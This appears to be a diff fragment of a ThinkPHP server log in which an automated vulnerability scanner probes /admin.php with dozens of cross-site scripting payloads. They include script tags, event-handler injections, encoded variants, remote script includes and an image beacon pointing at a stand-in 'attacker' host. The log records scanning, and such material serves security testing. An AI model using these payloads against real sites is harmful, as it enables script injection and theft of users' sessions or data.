+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000718s ]
+ERR: 无法加载模块:1TqPKy
+MtS8(9371)
+
+[ 2017-11-18T19:59:46+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<WVKVJQ>7BMRO[!%2b!]</WVKVJQ>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000719s ]
+ERR: 无法加载模块:17BMRO[!+!]
+
+[ 2017-11-18T19:59:46+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<ifRAme%20sRc=9929.com></IfRamE>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000666s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:46+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<ALqjbA%20x=9382>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000774s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:46+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<img%20sRc='http://attacker-9409/log.php%3f
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000672s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:46+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<UhKCT7<
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000597s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T20:00:49+08:00 ] 127.0.0.1 /admin.php/937729%40
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000570s ]
+ERR: 无法加载模块:937729@
+
+[ 2017-11-18T20:00:49+08:00 ] 127.0.0.1 /admin.php/1<ScRiPt>24Pp(9614)</ScRiPt>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001009s ]
+ERR: 无法加载模块:124Pp(9614)
+
+[ 2017-11-18T20:00:49+08:00 ] 127.0.0.1 /admin.php/<WJV9AO>KVNUM[!%2b!]</WJV9AO>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001009s ]
+ERR: 无法加载模块:KVNUM[!+!]
+
+[ 2017-11-18T20:00:49+08:00 ] 127.0.0.1 /admin.php/<ScRiPt%20%0d%0a>24Pp(9570)</ScRiPt>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000655s ]
+ERR: 无法加载模块:24Pp(9570)
+
+[ 2017-11-18T20:00:49+08:00 ] 127.0.0.1 /admin.php/<ScRiPt/acu%20src=//testasp.vulnweb.com/t/xss.js%3f9663></ScRiPt>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000766s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T20:00:49+08:00 ] 127.0.0.1 /admin.php/<video><source%20onerror="javascript:24Pp(9100)">
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000703s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T20:00:49+08:00 ] 127.0.0.1 /admin.php/<isindex%20type=image%20src=1%20onerror=24Pp(9172)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000579s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T20:00:49+08:00 ] 127.0.0.1 /admin.php/<iframe%20src='data:text/html;base64%2cPHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo='%20invalid='9851'>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000725s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T20:00:49+08:00 ] 127.0.0.1 /admin.php/<body%20onload=24Pp(9135)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000597s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T20:00:49+08:00 ] 127.0.0.1 /admin.php/<img/src="//testasp.vulnweb.com/t/dot.gif"onload=24Pp(9122)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000593s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T20:00:49+08:00 ] 127.0.0.1 /admin.php/<img%20src=xyz%20OnErRor=24Pp(9232)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000517s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T20:00:49+08:00 ] 127.0.0.1 /admin.php/<img/src=">"%20onerror=alert(9282)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000684s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T20:00:49+08:00 ] 127.0.0.1 /admin.php/%253C%2553%2563%2552%2569%2550%2574%2520%253E%2532%2534%2550%2570%25289822%2529%253C%252F%2573%2543%2572%2569%2570%2554%253E
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000506s ]
+ERR: 无法加载模块:%3C%53%63%52%69%50%74%20%3E%32%34%50%70%289822%29%3C%2F%73%43%72%69%70%54%3E
+
+[ 2017-11-18T20:00:49+08:00 ] 127.0.0.1 /admin.php/%26lt;ScRiPt%26gt;24Pp(9381)%26lt;/sCripT%26gt;
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000636s ]
+ERR: 无法加载模块:&lt;ScRiPt&gt;24Pp(9381)&lt;
+
+[ 2017-11-18T20:00:49+08:00 ] 127.0.0.1 /admin.php/<input%20autofocus%20onfocus=24Pp(9395)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000655s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T20:00:50+08:00 ] 127.0.0.1 /admin.php/<a%20HrEF=http://www.vulnweb.com></a>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000785s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T20:00:50+08:00 ] 127.0.0.1 /admin.php/<a%20HrEF=jaVaScRiPT:>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000491s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T20:00:50+08:00 ] 127.0.0.1 /admin.php/[url=http://www.vulnweb.com][/url]
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000858s ]
+ERR: 无法加载模块:[url=http:
+
+[ 2017-11-18T20:00:50+08:00 ] 127.0.0.1 /admin.php/<img<!--%20-->%20src=x%20onerror=alert(9865);//><!--%20-->
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000061s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001312s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T20:00:50+08:00 ] 127.0.0.1 /admin.php/}body{acu:Expre/**/SSion(24Pp(9600))}
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000668s ]
+ERR: 无法加载模块:}body{acu:Expre
+
+[ 2017-11-18T20:00:50+08:00 ] 127.0.0.1 /admin.php/<%25%20contenteditable%20onresize=24Pp(9806)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000565s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T20:00:50+08:00 ] 127.0.0.1 /admin.php/;8Lcnd%0a1<ScRiPt>24Pp(9572)</ScRiPt>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000691s ]
+ERR: 无法加载模块:;8Lcnd
+124Pp(9572)
+
+[ 2017-11-18T20:00:50+08:00 ] 127.0.0.1 /admin.php/<WP9F8B>XIHBI[!%2b!]</WP9F8B>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000509s ]
+ERR: 无法加载模块:XIHBI[!+!]
+
+[ 2017-11-18T20:00:50+08:00 ] 127.0.0.1 /admin.php/1<ScRiPt>prompt(907619)</ScRiPt>=%a2
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000831s ]
+ERR: 无法加载模块:1prompt(907619)
+
+[ 2017-11-18T20:00:50+08:00 ] 127.0.0.1 /admin.php/<ifRAme%20sRc=9763.com></IfRamE>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000748s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T20:00:50+08:00 ] 127.0.0.1 /admin.php/<PQ2M9S%20x=9536>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000533s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T20:00:50+08:00 ] 127.0.0.1 /admin.php/<img%20sRc='http://attacker-9600/log.php%3f
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000535s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T20:00:50+08:00 ] 127.0.0.1 /admin.php/<6N3SBb<
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000720s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T20:01:55+08:00 ] 127.0.0.1 /admin.php?c=login&m=1acuDZH8GhRYFw
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000622s ]
+ERR: 无法加载模块:1acuDZH8GhRYFw
+
+[ 2017-11-18T20:01:55+08:00 ] 127.0.0.1 /admin.php?c=login&m=1acuCC73G55t29
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.002841s ]
+ERR: 无法加载模块:1acuCC73G55t29
+
